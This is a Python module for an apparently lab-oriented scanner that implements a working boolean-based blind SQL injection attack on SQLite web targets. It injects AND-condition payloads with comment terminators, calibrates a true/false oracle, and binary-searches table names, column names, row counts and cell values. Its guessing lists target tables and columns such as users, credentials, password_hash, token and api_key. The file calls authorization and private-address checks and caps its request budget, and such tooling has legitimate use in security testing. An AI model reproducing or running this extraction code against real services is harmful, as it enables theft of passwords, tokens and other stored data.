from __future__ import annotations

import re
import time
from dataclasses import asdict, dataclass
from typing import Iterable

from .analyzer import snapshot_similarity
from .control import ScanCancelled, ScanControl
from .models import RequestConfig, ResponseSnapshot
from .safety import require_authorization, require_private_mapping_target
from .transport import HTTPClient

COMMON_TABLES = ["users","user","accounts","account","admins","admin","profiles","customers","members","products","items","orders","sessions","tokens","secrets","credentials","settings","config","messages"]
COMMON_COLUMNS = ["id","user_id","username","user_name","name","email","password","password_hash","passwd","hash","token","access_token","secret","api_key","role","is_admin","active","created_at","updated_at","title","description","price","status","owner","owner_id"]
_IDENTIFIER = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")


def _identifier(value: str) -> str:
    if not _IDENTIFIER.fullmatch(value): raise ValueError(f"Unsafe SQL identifier: {value!r}")
    return '"' + value.replace('"','""') + '"'

def _sql_string(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"

@dataclass(slots=True)
class MappingResult:
    dbms: str
    tables: dict[str, dict[str, object]]
    requests_sent: int
    truncated: bool
    context: str = "numeric"
    stopped_early: bool = False
    errors: list[str] | None = None
    def to_dict(self) -> dict[str, object]: return asdict(self)

class _MapBudgetReached(RuntimeError): pass

class SQLiteBlindMapper:
    """Lab-only boolean inference mapper for SQLite targets on private/loopback addresses."""
    def __init__(self, client: HTTPClient | None = None) -> None:
        self.client = client or HTTPClient(); self._requests=0; self._true_ref=None; self._false_ref=None; self._cache: dict[str,bool]={}; self._control=ScanControl(); self._budget=2000; self._started=0.0; self._target_addresses: frozenset[str] | None = None

    @staticmethod
    def _payload(condition: str, context: str) -> str:
        if context=="numeric": return f" AND ({condition}) -- "
        if context=="string": return f"' AND ({condition}) -- "
        raise ValueError("context must be 'auto', 'numeric', or 'string'")

    def _request(self, config: RequestConfig, value: str, label: str) -> ResponseSnapshot:
        self._control.checkpoint()
        if self._target_addresses is not None:
            require_private_mapping_target(config.url, expected_addresses=self._target_addresses)
        if self._requests >= self._budget: raise _MapBudgetReached("mapping request budget reached")
        if time.monotonic()-self._started >= config.max_duration: raise _MapBudgetReached("mapping max_duration reached")
        self._requests += 1; idx=self._requests
        self._control.emit("request-start",phase="mapping",label=label,index=idx,budget=self._budget)
        response=self.client.request(config,value)
        self._control.emit("request-complete",phase="mapping",label=label,index=idx,budget=self._budget,status=response.status,length=response.length,elapsed_ms=round(response.elapsed*1000,2))
        if response.status==0: raise RuntimeError(f"boolean inference request failed: {response.error or 'network/configuration error'}")
        return response

    def _ask(self, config: RequestConfig, original_value: str, condition: str, context: str) -> bool:
        cache_key=f"{context}:{condition}"
        if cache_key in self._cache: return self._cache[cache_key]
        response=self._request(config,original_value+self._payload(condition,context),"oracle")
        if self._true_ref is None or self._false_ref is None: raise RuntimeError("boolean oracle is not calibrated")
        true_score=snapshot_similarity(response,self._true_ref); false_score=snapshot_similarity(response,self._false_ref)
        if response.status==self._true_ref.status!=self._false_ref.status: true_score+=0.25
        if response.status==self._false_ref.status!=self._true_ref.status: false_score+=0.25
        result=true_score>=false_score; self._cache[cache_key]=result; return result

    def _calibrate_context(self, config: RequestConfig, original_value: str, context: str) -> tuple[ResponseSnapshot,ResponseSnapshot,float]:
        true_ref=self._request(config,original_value+self._payload("1=1",context),f"calibrate-{context}-true")
        false_ref=self._request(config,original_value+self._payload("1=0",context),f"calibrate-{context}-false")
        sim=snapshot_similarity(true_ref,false_ref); separation=(1.0-sim)+(0.35 if true_ref.status!=false_ref.status else 0.0)
        return true_ref,false_ref,separation

    def _calibrate(self, config: RequestConfig, original_value: str, context: str) -> str:
        candidates=[context] if context in {"numeric","string"} else ["numeric","string"] if context=="auto" else []
        if not candidates: raise ValueError("context must be 'auto', 'numeric', or 'string'")
        best=None
        for candidate in candidates:
            true_ref,false_ref,separation=self._calibrate_context(config,original_value,candidate)
            if best is None or separation>best[0]: best=(separation,candidate,true_ref,false_ref)
        if best is None: raise RuntimeError("boolean oracle calibration failed")
        separation,selected,self._true_ref,self._false_ref=best
        if self._true_ref.status==self._false_ref.status and snapshot_similarity(self._true_ref,self._false_ref)>0.985:
            raise RuntimeError("Boolean oracle could not be calibrated: true and false responses are effectively identical.")
        self._control.emit("phase",name="calibration",status="complete",context=selected,separation=round(separation,4))
        return selected

    def _infer_int(self, config: RequestConfig, original_value: str, expression: str, *, context: str, upper: int) -> tuple[int,bool]:
        low,high=0,upper
        if self._ask(config,original_value,f"({expression}) > {upper}",context): return upper,True
        while low<high:
            mid=(low+high)//2
            if self._ask(config,original_value,f"({expression}) > {mid}",context): low=mid+1
            else: high=mid
        return low,False

    def _infer_codepoint(self, config: RequestConfig, original_value: str, code_expr: str, *, context: str) -> int:
        if not self._ask(config,original_value,f"{code_expr} > 127",context): low,high=0,127
        elif not self._ask(config,original_value,f"{code_expr} > 255",context): low,high=128,255
        else: low,high=256,0x10FFFF
        while low<high:
            mid=(low+high)//2
            if self._ask(config,original_value,f"{code_expr} > {mid}",context): low=mid+1
            else: high=mid
        return low

    def _infer_text(self, config: RequestConfig, original_value: str, expression: str, *, context: str, max_chars: int) -> tuple[str,bool]:
        length,truncated=self._infer_int(config,original_value,f"length({expression})",context=context,upper=max_chars)
        chars=[]
        for position in range(1,length+1):
            code=self._infer_codepoint(config,original_value,f"unicode(substr({expression},{position},1))",context=context)
            try: chars.append(chr(code))
            except ValueError: chars.append("�")
            self._control.emit("mapping-progress",position=position,length=length,requests=self._requests)
        return "".join(chars),truncated

    def map_database(self, config: RequestConfig, *, original_value: str="1", context: str="auto", authorized: bool=False,
                     common_tables: Iterable[str]|None=None, common_columns: Iterable[str]|None=None, max_rows: int=3,
                     max_chars: int=64, max_requests: int=2000, control: ScanControl|None=None) -> MappingResult:
        require_authorization(authorized); self._target_addresses=require_private_mapping_target(config.url); self.client.validate_config(config,original_value)
        if max_rows<1 or max_rows>20: raise ValueError("max_rows must be between 1 and 20")
        if max_chars<1 or max_chars>256: raise ValueError("max_chars must be between 1 and 256")
        if max_requests<10 or max_requests>10000: raise ValueError("max_requests must be between 10 and 10000")
        tables_to_try=list(common_tables or COMMON_TABLES); columns_to_try=list(common_columns or COMMON_COLUMNS)
        for name in tables_to_try+columns_to_try: _identifier(name)
        self._requests=0; self._cache={}; self._control=control or ScanControl(); self.client.sleep_callback=self._control.sleep; self._budget=max_requests; self._started=time.monotonic()
        result: dict[str,dict[str,object]]={}; any_truncated=False; errors=[]; stopped=False; selected=context
        try:
            self._control.emit("phase",name="calibration",status="running")
            selected=self._calibrate(config,original_value,context)
            self._control.emit("phase",name="tables",status="running")
            for table_idx,table in enumerate(tables_to_try,1):
                self._control.checkpoint(); self._control.emit("mapping-table",name=table,index=table_idx,total=len(tables_to_try))
                exists=self._ask(config,original_value,f"EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name={_sql_string(table)})",selected)
                if not exists: continue
                columns=[]
                for column in columns_to_try:
                    condition=f"EXISTS(SELECT 1 FROM pragma_table_info({_sql_string(table)}) WHERE name={_sql_string(column)})"
                    if self._ask(config,original_value,condition,selected): columns.append(column)
                count,count_truncated=self._infer_int(config,original_value,f"SELECT COUNT(*) FROM {_identifier(table)}",context=selected,upper=max_rows)
                any_truncated|=count_truncated; rows=[]
                for row_index in range(min(count,max_rows)):
                    row={}
                    for column in columns:
                        expr="COALESCE(CAST((SELECT "+f"{_identifier(column)} FROM {_identifier(table)} LIMIT 1 OFFSET {row_index}"+") AS TEXT),'')"
                        value,text_truncated=self._infer_text(config,original_value,expr,context=selected,max_chars=max_chars)
                        row[column]=value; any_truncated|=text_truncated
                    rows.append(row)
                result[table]={"columns":columns,"row_count":count,"rows":rows,"row_count_truncated":count_truncated}
            self._control.emit("phase",name="tables",status="complete")
        except (_MapBudgetReached,ScanCancelled) as exc:
            stopped=True; errors.append(str(exc)); self._control.emit("stopped",reason=str(exc))
        return MappingResult(dbms="sqlite",tables=result,requests_sent=self._requests,truncated=any_truncated,context=selected,stopped_early=stopped,errors=errors)
